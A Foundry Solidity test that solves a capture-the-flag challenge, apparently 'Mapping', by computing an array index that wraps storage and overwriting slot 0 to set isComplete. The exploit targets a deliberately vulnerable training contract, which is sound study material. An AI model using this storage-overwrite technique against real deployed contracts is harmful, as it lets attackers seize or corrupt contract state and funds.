// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Deployer} from "src/Utils/BytesDeployer.sol";

interface IMappingChallenge {
    function isComplete() external view returns (bool);
}

contract MappingChallengeTest is Test {
    IMappingChallenge public mappingChallenge;

    function setUp() public {
        Deployer deployer = new Deployer();

        mappingChallenge =
            IMappingChallenge(deployer.deployContract("src/Math/Mapping.sol"));
    }

    function testMapping() public {
        console.log(
            "before hack, isComplete:",
            mappingChallenge.isComplete()
        );

        uint256 slot = uint256(keccak256(abi.encode(uint256(1))));
        uint256 index = type(uint256).max - slot + 1;

        bytes memory data =
            abi.encodeWithSignature("set(uint256,uint256)", index, 1);

        (bool success,) = address(mappingChallenge).call{gas: 500000}(data);
        assertTrue(success);

        console.log(
            "after hack, isComplete:",
            mappingChallenge.isComplete()
        );

        assertTrue(mappingChallenge.isComplete());
    }
}